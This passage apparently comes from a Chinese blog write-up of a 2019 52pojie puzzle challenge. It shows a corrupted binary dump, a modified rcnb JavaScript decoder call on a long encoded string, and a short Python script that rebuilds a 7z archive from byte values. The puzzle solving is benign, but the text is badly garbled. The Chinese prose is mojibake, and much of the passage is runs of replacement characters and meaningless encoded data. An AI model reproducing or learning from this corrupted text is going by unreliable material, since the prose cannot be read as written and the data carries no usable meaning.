class="line">ï¿½ï¿½ï¿½[&apos;ï¿½ï¿½Ylï¿½×™*bï¿½ï¿½ï¿½ï¿½Gï¿½1ï¿½Bï¿½ï¿½ï¿½ï¿½ï¿½~ï¿½:ï¿½Ùˆï¿½ï¿½×‰ï¿½ï¿½Aenqdï¿½)Ã¼#ï¿½EG-:ï¿½S/ï¿½ACb_[ï¿½Vï¿½Hï¿½l=Vgï¿½-</span><br><span class="line">ï¿½Û´ï¿½b7&amp;ï¿½ï¿½ï¿½ihCzï¿½ï¿½KLE0ï¿½ï¿½)ï¿½ï¿½Hå’£BTï¿½0(kï¿½ï¿½ï¿½ï¿½mï¿½&quot;ï¿½`ï¿½ï¿½bï¿½Ä¥qï¿½&lt;IUï¿½1ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½\ï¿½ï¿½[ï¿½</span><br><span class="line">kï¿½ï¿½%ï¿½ï¿½ï¿½&quot;É¡ï¿½è½a8ï¿½ï¿½Hï¿½ï¿½gbï¿½ï¿½Q</span><br><span class="line">                        Jï¿½ï¿½ZLLï¿½ï¿½</span><br><span class="line">ï¿½_ï¿½$ï¿½|ï¿½É¡ï¿½ï¿½ï¿½ï¿½Rï¿½Eï¿½wuï¿½ï¿½t7#)Sï¿½\ï¿½ï¿½ï¿½ï¿½ï¿½;&#123;lï¿½Wï¿½ï¿½ï¿½ï¿½ï¿½Iï¿½*Yï¿½ï¿½&#125;ï¿½ï¿½GNï¿½pï¿½k*ï¿½?ï¿½2ï¿½@ï¿½Sï¿½&#125;ï¿½ï¿½ï¿½33ï¿½ï¿½ï¿½v</span><br><span class="line">                                                                             ï¿½ï¿½ï¿½/ï¿½ï¿½ï¿½^Ó‡ï¿½ï¿½!ï¿½Rï¿½Nï¿½ï¿½Fï¿½ï¿½5[ï¿½2ï¿½bvX ï¿½ï¿½ßï¿½EØ%ï¿½ï¿½ï¿½dï¿½ï¿½ï¿½</span><br><span class="line">                ï¿½ï¿½Tï¿½@ï¿½ï¿½dyï¿½ï¿½rï¿½ï¿½Bï¿½ï¿½ï¿½?aHxï¿½ï¿½ï¿½ï¿½ï¿½&quot;ï¿½gï¿½ï¿½ï¿½ï¿½å‘´^+ï¿½ï¿½|t$&#125;ï¿½xï¿½C.ï¿½ï¿½ï¿½bp</span><br><span class="line">ï¿½Xï¿½lU|ï¿½ï¿½&amp;×¶ï¿½ï¿½&#125;(ï¿½ï¿½ï¿½Oï¿½eq8s=åº—ï¿½Cï¿½#^ï¿½cï¿½Qï¿½ï¿½&gt;ï¿½8ï¿½ï¿½^ï¿½ï¿½ï¿½Ö™ï¿½ï¿½ï¿½b6&amp;ï¿½ï¿½iï¿½5FTï¿½m$5ï¿½|ï¿½Xï¿½tAï¿½ï¿½ï¿½sï¿½ï¿½&#125;ï¿½ï¿½.hï¿½ï¿½ï¿½Yï¿½ï¿½rï¿½&#125;ï¿½(ï¿½,ï¿½&lt;Wï¿½ï¿½ï¿½Vï¿½ï¿½ï¿½ï¿½ï¿½`ï¿½V08Kï¿½ï¿½ -Vï¿½CVï¿½ï¿½&#125;ï¿½~dï¿½ï¿½ï¿½ 0ï¿½yï¿½ï¿½</span><br><span class="line">                              qï¿½ï¿½ï¿½ï¿½wWxZeï¿½ï¿½#q&quot;ï¿½×´ï¿½=ï¿½%ï¿½ï¿½hï¿½!ï¿½ï¿½_ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½#ï¿½ï¿½á·«DA8^kJqÉŠï¿½=Eï¿½&#123;%ï¿½m&gt;ï¿½ï¿½kï¿½ p</span><br><span class="line">                                                                                                 $ï¿½</span><br><span class="line">SLË“`ï¿½ï¿½]y</span><br><span class="line">        b</span><br><span class="line">v</span><br><span class="line">ï¿½ï¿½</span><br></pre></td></tr></table></figure><p>æœ€åé¢ç»™å‡ºçš„trialçœ‹å¼€å¤´æ˜¾ç„¶æ˜¯ä¸ª7zï¼Œé‚£ä¸Šé¢çš„keyåº”è¯¥å°±æ˜¯å¯†ç äº†ã€‚æˆ‘æŠŠå®ƒå­˜ä¸ºä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œç„¶è€Œè¿™ä¸ªå­—ç¬¦<code>ï¿½</code>ä¸¥é‡å¹²æ‰°äº†æˆ‘å¥½å‡ ä¸ªå°æ—¶ï¼Œè®©æ‡µé€¼çš„æˆ‘ä¸€åº¦ä»¥ä¸ºè¿™æ˜¯é¢˜ç›®è®¾è®¡çš„åŠ å¯†ã€‚ä¸€å¼€å§‹æˆ‘<code>xxd</code>äº†ä¸€ä¸‹æ–‡ä»¶ï¼Œå‘ç°æœ‰ä¸‰ä¸ªå­—èŠ‚<code>efbfbd</code>é¢‘ç¹å‡ºç°505æ¬¡ï¼š</p><p><img src="/pics/2019-å¾çˆ±ç ´è§£è§£é¢˜é¢†çº¢åŒ…æ´»åŠ¨/3.png" alt="éœ‡æƒŠçš„xxdç»“æœ"></p><p>æ ¹æ®7zæ–‡ä»¶å¤´<code>377a bcaf 271c 0004</code>å°è¯•è¿‡æ›¿æ¢ï¼Œä¸€åº¦ä»¥ä¸ºæ‰è¿›äº†è„‘æ´çš„é™·é˜±ã€‚ç›´åˆ°æˆ‘çœ‹åˆ°<a href="https://liudanking.com/golang/utf-8_replacement_character/" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>ï¼Œæ‰çŸ¥é“è¿™ä¸²å­—èŠ‚å°±æ˜¯é‚£ä¸ªå­—ç¬¦ã€‚</p><p>åæ¥åœ¨githubä¸Šæ‰¾åˆ°äº†rcnbçš„æºç ï¼Œä¿®æ”¹jsï¼Œå°†æ˜æ–‡æ¯ä¸ªå­—èŠ‚ä»¥intçš„å½¢å¼è¾“å‡ºï¼Œå†ç”¨pythonä¸€è·‘æ‹¿åˆ°å‹ç¼©åŒ…ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printRes</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> res=rcnb.decode(str)</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;res.length; i++) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res[i])</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// console.log(res)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printRes(<span class="string">'Å˜ÄˆÃ‘Æ€ÆÆ„Å˜È»Å–ÄŠÇ¸Æ€rcnÆƒÅˆÃŸÉÄ‰ÆÆ€RÄŒÅ†bRÃ‡rcnbrcnbrcnbÅ–ÄŠÆÆƒrcnbrcnbrcnbrÄŒNÃ¾È“Ä‰ÆÆnÆ…Å”Æ‡Å„ÃrÄ‡Ç¹ÆÈ“Ä†Ã‘Æ…Å”È¼Å•Ã‡ÆÆ…ÆÃŸÈCÅ…ÆÈÆ‡Å–Ä†ÅˆÆÉŒÆ‡ÈµÆƒÈ‘ÄˆÈ ÆƒNÆƒÆ¦ÄÆÆ„È“Ä‰Å•ÄŒÅˆÆƒÅ‡bÈÄ†È‘Ä‡nÆ…Å˜È¼ÈµÃŸÆÃŸRÄ†Ç¸Æ„ÉŒCÆBÈ‘ÄŠÅ…ÃÅ—ÄŠÉŒÈ¼ÅƒÃŸÅ‡ÆÅ”cÅ”ÆˆÇ¹ÃÈ ÆÉŒÄ†Å„Æ…ÉÄ‰ÆÃÅ–Ã‡ÉŒcÅ‡Æ…Å–Ä†nÃ¾Å„ÆÈ“ÄŒÅˆÆ„Å˜È»È“È»nÆƒÇ¸ÆÉŒCÈ’Ä‡ÈµÆÈµÆ„ÉŒCÅ…Æ…ÈÄÅƒÆ€Å™CÅ™Æ‡Å‡ÆÇ¸Ã¾Å™Ã‡ÆbÆ¦ÄŒnbRCÆÃŸÈÄ‡Ç¹ÆÅ”È»Å™È»Å†BÇ¹BÈ‘Ä‹Å—Ã‡ÆÆƒÈ BÉŒÄ†Ã‘ÆƒÅ•ÄÅ†ÆƒÈ“Æ‡Å„bÅ–ÄÃ‘bÉŒÄŠÅ—ÆˆÃ‘BRcÆÆÈ‘Æ‡Å„ÃÆ¦ÄŒÇ¹Æ€Ç¸Æ€Å˜cÅ˜È»nÆ…RCÅ†ÆƒÅ…Æ„ÈÄ‰NÃÅ˜ÄˆÃ‘Æ„Å•ÄÈÄ‡Ç¹bÅ‡ÃÈ“Ä‡Ç¹ÃŸÉŒÄˆÅ”È»ÅˆÆ€ÆbÈÃ‡rCÇ¹ÃÈ“È»ÅƒBÅ„Æ„ÉÄ‹Å„bÉŒÄŒÅ—Æ‡nÆ…ÈµÆ€Å—Ä‹Å†ÃŸRCÅ‡bÅ™ÄŒÅ™Ä‡Ã‘Æ€ÈÄŠÅƒbÇ¸Æ…ÉcÈ‘CÈµbÇ¸ÃŸÈ‘Æ‡È‘CÇ¹Æ…Å˜È»ÅƒÆƒÅ™Ä‹ÅƒÃ¾nÆ„RÄ‹Ç¹BrÆ‡Å„ÆƒÅ–ÄˆÈ‘Ä‰Å†bÆÆ…Æ¦Ä†rCÆÃÆ¦Ä†Ã‘BÅ†Æ„rÄ‡È‘Æ‡Ã‘Æ…Å„Æ„Æ¦Æ‡Å—Ä†nÆ€Å”Ä†È Æ„ÈÄ‡NÆ€Ã‘Æ…Æ¦È¼È“Ä‰Å‡Æ„ÈµÃŸÈ‘CÇ¹Æ„ÈÈ¼Å—Ä‡È ÆƒÅ…BÈ“CÈ ÆÅ”Ä‹ÆÃŸÅ™cÅ˜ÄÅ…bÆ¦ÄŠÆÆƒÉŒÄ‹ÆÆ€nÆÅ˜È»Ã‘bÅ–ÄÅ—CnÃ¾È’È»Ã‘Æ…NÃ¾Å™È¼rÆˆNÆÅ•Ä†ÆBÈÃ‡ÅˆÆ…ÈCÅƒÃŸÅ…Æ„rÄ‡ÆÆ€È“ÄŠÅ„ÆƒÅ–Æ‡Ç¸ÆÅ™Ä‹Å˜Ä‡ÅƒÆÅ˜È¼Ã‘Æ…È‘Ä‹ÈµÆ€ÅƒÃ¾rÆ‡ÅƒÃŸÅ•Ä‰rÄ‡NÃ¾È’È»ÆÆÉŒÆˆÈ bÆ¦ÄŠNÆ…Å”CÆÃŸÈ“ÄŒÅ„ÃÆ¦Ä‹Å‡bÅ–ÆˆÅ†ÆƒÅ–Ä‰ÈµÃ¾nÆƒÉÄ‰ÉŒÆˆÅˆÃÅ™ÄÇ¹BÈ bÅ•Ä‰Å™Ä‹Å„Ã¾Å†Æ„È‘Ã‡ÆÆÈ’cÅ˜Ä‰Ç¸Æ…ÅˆÆƒÈ’cÅ”ÄˆÅ„ÃŸÇ¹ÆÆ¦Ä‡È“È¼Ç¹ÆÃ‘ÆÆ¦CÈ‘Ä‹Å‡Æ„È“ÆˆnÆ„ÈµÆ„rcÅ˜ÄnÆƒÈµÃŸRÄÈ‘cNÆrÄŠNÆ…ÈÃ‡Å‡ÆÅ†ÆÈ’ÄnÆ€ÉŒÄŒÅˆbÉŒÄ†rÈ¼ÆÃÅ‡ÆƒÉŒCÅ™Ã‡nÃ¾ÅˆÆ…È’È¼ÆBÈ‘cÈÈ»nBÅˆÆÈ‘Ä‹È“cÈ bÇ¹Ã¾È‘Æ‡Ç¹ÆrÄˆÅ–ÆˆÅˆÆÅ—cÈµbÅˆÃ¾Å™È¼Æ¦ÄˆÅƒÆ…ÅˆÃŸÅ—cÅƒÆ€Æ¦ÄŠÅ”cÅ„ÃÅ–Ä‰È Æ…ÅƒÆÈ‘ÄŠÈÃ‡È Ã¾ÆÃÉŒÆ‡ÈµÆ…ÈÈ¼ÉÄ‰Ã‘BrÆ‡Å‡Æ…Å”ÄÆÃŸnÆ…Å—ÄˆÉÄ†ÈµÆ…Å–ÄŒÅ†bÅ–Ä†È ÃÈ’Ä‹Ã‘ÆƒÅ—Ä‹NÆƒÅ•È»ÅƒÃNÃÅ”ÄÅ•Ä†ÆÆƒNÆƒRÄŒÈÄ†Å†ÆÅƒÆ€Å™Ä‹ÅƒbÈ“ÄÆÆƒÈ‘cÅ”Ä†NÃ¾È‘ÄÈ bÅ—Ä†NÃ¾Å‡ÆÈ“ÄrÄÅƒÆ„È‘Ä‰nÃ¾Å…Ã¾È“È»Å™cÃ‘Æ„Å–Æ‡Ã‘ÃŸÈÄ†Å„bÅ…bÅ•ÄŠÅƒÃŸÅ•ÄŒÅ‡ÃÈ’cÃ‘ÆÈ‘Ä†Å˜Ã‡Å„ÆƒRÆˆÇ¸Æ…Å•cÈ bÅ†ÃÈ‘Ä‹RÆˆÅ‡Æ€ÈcÅˆÃ¾Å„ÃÆ¦ÄˆÉCÈ Æ€Ã‘BRÄ‰Ç¸ÆÅ—È¼È‘Æ‡nÆÈµÃŸÅ•Æ‡Å–Ä‹ÆÆ…Å™Æ‡Ç¹Ã¾Å‡Æ„Å–Ã‡È ÆƒRÄˆÇ¸Æ…Å•Æ‡Å†Ã¾Å”ÄŠÅ™ÆˆÅˆbÆÃŸrÆˆÅ•Ã‡Ç¸Ã¾ÅƒÃÈÄ†nbÈ‘Ä‰È‘È»Ç¸ÆƒÇ¹Æ€RÆ‡rÆˆNbnÆ„rÄ‹rÄ‰Å…BÆ¦cÅˆÃ¾RÄ‹ÅˆÆnBÅ—È¼Ã‘ÆÅ•Ä‹ÆÃŸÉÄˆÅ—Ä‡Å†Æ€Ç¹ÆÈ‘ÄˆÅ…Ã¾Å”Æ‡ÅˆÆ…Å—Æ‡rÄŠÇ¹Æ„Ç¸ÃŸÈ’ÆˆÇ¹ÃŸÅ•È»È BÅ”Ä‡ÆÃ¾Å”È»Ã‘BÈ“Ä†Ç¸ÃÈ‘Ä‹Å•Ä‰ÅƒÃ¾ÅƒÆ€Å˜cÅ™È»Ã‘BÅ…Æ€ÉŒÆˆÅ„Æ„Å”ÄŠÃ‘ÃÆ¦ÄˆÆÆƒÈ“È¼Å†ÆÅ˜È»nÆ„Å”Ä‡Å–Ä‹Ç¸Æ„Å…BÅ–Ã‡È“Ä‰Å…BÅˆÆ„ÈÈ¼Å–Ã‡Å†bÇ¹Æ…rÈ»Ã‘ÃÅ”ÄŒÅ…ÃŸÅ”ÄŠNÃ¾ÉŒÆ‡È ÃRÄ‰nÃ¾Å™ÄÅ•Ä‹NÃ¾È Ã¾Æ¦È¼È Æ…RÄ†Ã‘Æ„Å—Ä‡Å˜ÄÅƒÆ„Å–Ã‡Ã‘Æ„Ç¹bÈ‘Ä†Å–Ã‡Ç¹Ã¾ÆÆ„È“cÆÆRCÇ¸Æ„ÉÄ‡È’ÄŒNÆ…È“È»ÅˆÃÅ†BRÄ†ÆbÅ™Æ‡Å–cÈ bÅ™È»Å„Æ„Å—Ä†ÅƒÃÅƒBÆ¦Ä‰Å—ÄŠNÃ¾Å™ÄŠÅ†ÃŸÈ’Ä†È ÆÈ‘ÄŠÅ…BÈÆˆÈµBÇ¹ÆÅ™crÄ‰ÆbnÆ€Æ¦Ä‹Å˜È¼Ã‘Æ€È’Ã‡Å„ÆÅ—CÈ ÆÆÃŸrÄŠÇ¹Ã¾Å—È»ÅƒÆ€È’È»ÉÄ‹NÃŸÅ–Ä‰Ç¸ÃŸÅƒÃrÆ‡È’È¼È ÆƒÅ™Æ‡ÅƒÆƒNbÅ˜Ä‹Æ¦ÄŒÅˆÆ…Å”ÄŒnBÅ—ÄŒÆbÆÃŸÅ”È¼Å”ÄŠÈ Æ€nÆ…Å–Ä‹Å•ÄÅ‡Æ„Ç¹BÅ”CÅ™Ä‹Ç¹Æ…ÈÄŒÅˆÆ€ÆÆ€Å™ÄˆÅ–ÄŒÈµÃŸÅ„ÃÉŒCÇ¹ÆƒÅ”Ä‡È“Ä‹Ã‘Ã¾Å•È¼ÆÆ„È’cÅ„bÇ¹bÈ“ÆˆÆÆ…ÉŒÄ†È Æ„Å–Ä‡Ç¹BÅ–ÆˆÅ˜Ã‡ÆÆ…Æ¦Ä‰ÅƒÆÅƒÃŸÅ–Ä‰NÆƒÅ”Ä‰Ã‘Æ„Å–ÄˆÆÃ¾È‘ÄŒÈ‘ÄŒnBÅƒÆÅ”ÄŒnÆƒÈ’ÄˆÈ“ÄˆNBÇ¸ÃŸÈCÈ ÃŸÈÄÅ…bÉÄ‰ÆÃ¾Æ¦Ä‰rÈ»Å…BÅ‡ÃŸÈ’È»Ç¸ÆÅ˜È¼Å˜Ä‹Å„BÅˆbÅ˜ÄnÆ„Å˜Ã‡È’ÆˆÅ‡Æ…Ç¹ÃÅ™Ä‡ÈÄ‡Å…ÃÆ¦Ä‹Å‡Æ„Å‡bÉŒÆ‡Æ¦Æ‡Å„Æ€ÅˆÆrÄŒRÄŒÅ†bÈ‘Ã‡Å…ÃŸÈµÆ…Å™È¼Å–Ä†Ç¸Æ€Å”CÆÆ€Å†ÃÈ“Æ‡rÄŠÅ‡Ã¾ÅˆbÅ•Ã‡ÅƒÆ„Å”ÆˆÅ„ÃÅ˜ÄŒÈÄŠÆbÅ™È»Ç¹ÆƒÉŒÄŒÈ BÅ„Æ„È’Æ‡NÃ¾Å™ÄŠÉŒÄ‡Å†BÅ•È¼È ÆƒÅ–Æ‡ÅˆÃ¾Ã‘ÃŸÈ“È¼È‘ÄŒÃ‘Æ…nÆ„ÉÄ‰nÃÅ—cÅ˜ÆˆÅˆÃŸÈ“Ä‰ÈµÆ„È‘cNbÈ ÃŸÆ¦Ã‡Å…ÆƒÉÄˆÆ¦ÄŠnÆÅ–Ã‡Å…BÅ”cÅƒÆÅ„ÆÉŒÄ‹ÅˆÃÅ•Ä‰Æ¦CÅ†Æ…Æ¦È»ÈµÆ…È“Ã‡Ç¹ÆƒÈ“Ä†È ÆƒRÈ»ÅˆÆƒÅ™Ä‡Ç¸Æ€Å—ÆˆÇ¹ÃŸÅ™Ä‰ÅˆbÈÄŒÅ„ÆÉÄˆÅ‡ÃÃ‘ÃÅ˜Ä‡Å—Ã‡NbÅ—È»Ã‘ÃRÆˆÇ¸ÆƒÇ¹Æ€Å•È»RÄ‰ÆBÅ„Ã¾Å˜È»Å”Ä†ÆÆÅ†BÅ•È»NBRÄ‰Å†ÆƒÈ“ÄŒÆÆÈÄ‹Ã‘Æ€RÄŒÅ•ÆˆÅˆÆ€rÄÅ‡Æ…ÈÄŠÅ…ÃÆ¦È¼Ç¹ÆÅˆÆƒÈ“ÄŠnÃ¾Å™ÄˆÅ˜CnÃ¾È Æ€È’cÆÆƒÉŒÄ‡ÉŒÄŠÈµÆ…Å•Æ‡ÅˆÆƒnÆ„Å”ÄÅ„ÃRÄŒÅ™È¼Å„bÅ‡ÃŸÅ•ÄŠÅˆÃ¾Å˜CÇ¹bÅ”ÄˆnbÅ•ÄŠÅ„Ã¾È‘cÅƒÆ„Å”ÄˆÅ”ÄÅ„bÈÄÈ BÅ™Ä‰Å…ÆƒÅ†ÆƒÅ˜ÆˆÉŒÃ‡Ã‘ÃÅ‡Æ„È“Ä‰ÉÄ‹ÅˆÆ…Å„Ã¾Å—CÅ™ÄŒÆÆ„RCÅ†ÃÆÆÅ”ÄˆRÈ¼NÆ…È’CnÆƒÉŒÆ‡Ç¹ÃŸÅ„ÃÅ•ÆˆÅ‡BÅ˜CÅ•È¼Ã‘BÈ’Ã‡ÅƒÃÇ¸ÆÈ“È¼Å•ÄŒÈ Ã¾ÈµÆÈ‘ÆˆÅ„Æ€Å”cÈ‘Æ‡Ã‘ÃŸrÆˆÇ¸ÃrcÅƒÃÅ‡Æ…È“Ä‡ÉŒÄ‡Å„Æ€ÉÄ‡ÅˆÆ€È Æ…Å˜È¼Ç¸ÆÉÄŠÅ™ÄÆÃÅ†ÆƒrÄŠÇ¸Æ€Å—cÈ“ÆˆÅ„Æ€Å‡Æ€ÈcrÄŠÅ…BÈ“ÄˆÈ ÆÉÄ‡nÆnÃÉŒÆ‡Ã‘ÆƒÈÈ¼ÆÃŸÅ”CÉÄ‡ÆbÆBÈ’cÅ†ÆrÄ‹nBÅ—ÆˆÈ“È»Å„ÆƒÉŒCÃ‘BÆÆ€È’ÄŒÅˆÃŸÅ”Æ‡Å™Æ‡Ç¹bÅ–cÅ†ÆƒÅ•Ä†ÅˆÃ¾Å•ÄŒÅ†Æ…È’Ä‰Å‡Æ…ÈÄˆÅ‡ÆÈ ÆƒRÄ‰Å”Æ‡Ç¸Ã¾Å˜ÄŠÈµÃŸÅ”È¼Å„bÈ‘ÆˆÈ BÇ¹BÉŒÄÈµÆƒrÄÇ¹Æ„Å”È»ÆÆ…Å—È¼È’Ä†ÆÆ€Å–Ä‰ÈµbÅ•cÆÃÈ’È¼Å„BrÄ‹Ç¸Æ…Å˜cÈ ÃÈÄÆbÈ“ÄŠÅ…bÅ˜CÈ Æ€ÉÄ†È Æ…Å•Ä‰NÆ€È ÃÅ–Ä‡Å™Ä‹Å„ÆÅ„Ã¾È“Ä‰È ÆÆ¦È»nÆ€È“Ã‡ÉÄˆÅ…Æ…Ç¸Æ€È“ÄÈ’È»Å†Æ€Ç¹ÃÉcÈ‘Ä†ÈµÆƒrÈ»ÆÆ€ÉŒCÅƒÃ¾ÉÄˆÈµÃ¾Å–ÄŒÅ†ÃŸÅˆÆ…Å—Ä‰Ã‘ÃÅ•ÆˆÈ‘cÅƒÆÇ¸ÃŸÈ’Æ‡ÈÃ‡ÆÃŸÅ„bÅ•ÆˆÈµBÅ•Æ‡nÆ„È“Ä‹È‘È¼È BÉÄ‹Å…ÃÅ—Ä‹Å…ÆƒÆ¦ÄÅ„Æ„ÅˆÃRÃ‡rcÅ…Æ„ÈÃ‡È ÃÅ™ÄÈ ÃÆBÉŒÈ¼ÉÄˆÅ‡Ã¾ÉÄ‰Ã‘Æ…Ç¸BrÄ†ÅˆÆƒÅ–È»Å•ÄÈµbÅ†ÃŸÅ˜ÄŠÆÆ€ÈÆˆnÃ¾Å˜ÄÈ“È»Ã‘ÃÅ•cÅ„Ã¾Å†bÅ”È¼ÉŒÄŒÃ‘BÉŒÄÈµbÈ‘ÄˆÅ…BÅ•Ä‰ÆÆ„Ã‘Ã¾È’Ã‡È“È»NÆ€Ã‘ÃŸÅ˜ÄˆÃ‘Æ€ÈÈ¼ÆBÅ”ÄˆÈµÃ¾ÉÄŠÃ‘ÃŸÅ•Ä‰È’È¼nÃ¾Å•Ã‡Å†bÅ„Ã¾ÉÄ†Å…ÃÅ—ÄŠÅƒÆƒRÄ‹Å†Æ…Å˜cNÃ¾È‘Ä†Å…ÆrÆˆÇ¸Æ„È’CÆÃ¾Å–È»rÃ‡Å‡bÅ™ÄŠÅ…Æ…È‘ÆˆÅƒBÆ¦Ä‹nÃŸÅˆÆ…Æ¦Ä‰Ã‘Ã¾È“ÄˆÅ™È¼ÅƒÆ€ÉcÅƒÆ„ÈµÃ¾ÉŒCÅ™Ä†NÆ„Ç¹Æ„Æ¦È»Å”ÄÅ…ÆƒnÆ…rÄ‹rCÇ¸Æ„È“ÆˆÅƒÆ€rÃ‡nÆrCÃ‘Æ…rCÈµÆ€rÆˆÇ¹ÃŸrÆˆÈµÆRÄ†ÆÆrÃ‡Å‡ÃÈµÃŸÆ¦ÄŒÈ‘È¼Ç¸ÆÇ¹BÈ‘cÉŒÆˆÆÃÈ’Ä†Å…ÃrÄ†ÅˆÆƒRÄ‡Å‡ÆÈ Æ…È“crc'</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">f = open(<span class="string">'plain_array.txt'</span>, <span class="string">'rb'</span>)</span><br><span class="line">t = f.read()</span><br><span class="line">f.close()</span><br><span class="line">data = t.split(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> len(data)</span><br><span class="line"><span class="comment"># print data</span></span><br><span class="line">f = open(<span class="string">'trial.7z'</span>, <span class="string">'wb'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">    f.write(chr(int(data[i])))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>è§£å‹åæ‹¿åˆ°ä¸€ä¸ªæ–°æ–‡ä»¶<code>nb</code>ï¼Œè¿˜æ˜¯è¢«åŠ å¯†äº†çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ÈÈ¼ÅƒÆÈ“Ä‰nÆ…Å•Æ‡Å…Æ€È“Æ‡ÅƒÆ…È’Ä‹ÆÃ¾Å•Æ‡NÆ„ÉŒÄ‡ÅƒÃÉŒCÈµBÈ’ÄŒNÆ„ÉŒCÅˆÆ€ÉŒÄ‡Ã‘bÈ’CÅ…ÃÅ•Æ‡Å‡ÆÈ“Æ‡Å„ÆÅ•Æ‡Å…Æ…È’CÅ†bÈ’Ä‹ÆÃÈ’ÆˆÆÆ€È’ÄŒnÆÉŒÄ‡ÅƒÃÈ“ÆˆÈ Æ…È“Æ‡NÃ¾ÉŒcÅ„BÈ“ÄŠÇ¸ÆÈ’È¼ÈµbÈ’ÆˆnbÉŒCÈµÃŸÈ’È¼È ÃÈ“Ä‰NÆÅ—Ä‡ÆÆ…RÄ‡Å‡bÆÆ…RÈ»Ã‘ÃŸÅ˜È»Å‡ÆrÄŠÅ„ÃŸÅ•ÄÈ Ã¾RÄ‰NÆÆ¦ÄˆÅ†BÆ¦cÇ¹ÃÆ¦Ä‡ÅƒbÆ¦ÄˆNÆÆ¦ÄˆÈ’Ä‡ÆÃnÆ…Å”Ä†Å†ÃrÈ¼È’Ä‡ÆÃ¾Ç¸ÃŸRÄŠÅ„Ã¾rÈ»NÃ¾rÄŒÅ„ÃŸÅ•ÄÇ¸ÃRÄŠÈµÃrÈ¼ÈµbÅ•Æ‡Å‡ÃrÄŠnÃÅ”Ä†nBÅ˜Ã‡ÆÆƒrÄ‰Ç¹Ã¾Æ¦Ä‡Å†Æ…Æ¦cÈµÆ€Æ¦Ä‡Å†BÆ¦cÇ¹ÃÆ¦Ä‡ÅƒbÆ¦ÄˆNÆÆ¦ÄˆÈ’Ä‡ÆÃnÆƒÅ”Ä†Ç¸Ã¾RÄŠÆÆƒrÄ‰ÅˆÃÆ¦Ä‰Å™Æ‡ÆÃ¾ÈµÆ…rÈ¼Å†brCnÆƒÅ”Ä†Å†ÃŸRÄ‡Å„ÃŸrÈ»Å„ÃŸÅ•ÄÅƒBRÄŠÆÆ…Å™È»ÆÆ€Å™Æ‡Ç¹Ã¾Æ¦Ä‡ÈµÃÅ™ÆˆÆÃ¾Å™È»Å…Ã¾Æ¦cÇ¸ÆÅ™È»Å†Æ„Æ¦cÆÃÅ™È»Å‡bÅ™Æ‡Ç¹ÃÆ¦Ä‡NÃ¾Æ¦ÄˆÆÆ„Å™È»Å†Æ€Æ¦cÇ¸ÆÅ™È»Å†Æ„Æ¦cÆÃŸÅ™È»Å†ÆÆ¦cÇ¹Ã¾Æ¦Ä‡Å†Æ„Æ¦cÆÆ„Å™È»Å†BÆ¦cÇ¹ÃÆ¦Ä‡ÅƒbÆ¦ÄˆÈµÆ€Æ¦Ä‡È’Ä‡ÆÃÅƒÆ„Å”CÆÃÅ™È»Å…Ã¾Æ¦cÅˆÃÆ¦Ä‰Å™Æ‡ÆÃ¾ÈµÆ…rÈ¼Å†brCÅƒÆ„Å”CÆÃŸÅ™È»Å…ÃÆ¦cÇ¹ÃÆ¦Ä‡ÈµÆ„Å™ÆˆÈµÆ€Æ¦Ä‡Å…ÃÆ¦cÅˆÃÆ¦Ä‰ÈµÆÅ™ÆˆÅ…ÃŸÅ™Æ‡È’Ä‡ÆÃ¾ÅƒBRÄŠÆÃŸÅ™È»Å†Æ€Æ¦cÅˆÃÆ¦Ä‰ÈµÆ„Å™ÆˆÆÃÅ™È»Å†Æ€Æ¦cÇ¹ÃÆ¦Ä‡NÃ¾Æ¦ÄˆÆÆ…Å™È»Å†Æ€Æ¦cÅˆÃÆ¦Ä‰ÈµÆ„Å™ÆˆÆÃ¾Å™È»Å‡bÅ™Æ‡Ç¸ÆÅ™È»Å†Æ„Æ¦cÆÃÅ™È»Å‡bÅ™Æ‡Ç¹ÃÆ¦Ä‡NÃ¾Æ¦ÄˆÆÆ„Å™È»Å†Æ€Æ¦cÇ¸ÆÅ™È»Å†Æ„Æ¦cÆÆ„Å™È»È’Ä‡ÆÃnÆƒÅ”Ä†Ç¸Ã¾RÄŠÅ‡Æ…rÄŠÅƒBrÄŒÅƒÆƒÅ”Ä‹Å„Ã¾rÈ»Å…brÄ‹Ç¹ÃÆ¦Ä‡ÈµÃÅ™ÆˆÈ“ÄnÃnÆ…rÄ‡Ç¸ÆƒÅ”Ä‡Ã‘Ã¾Å˜È»È 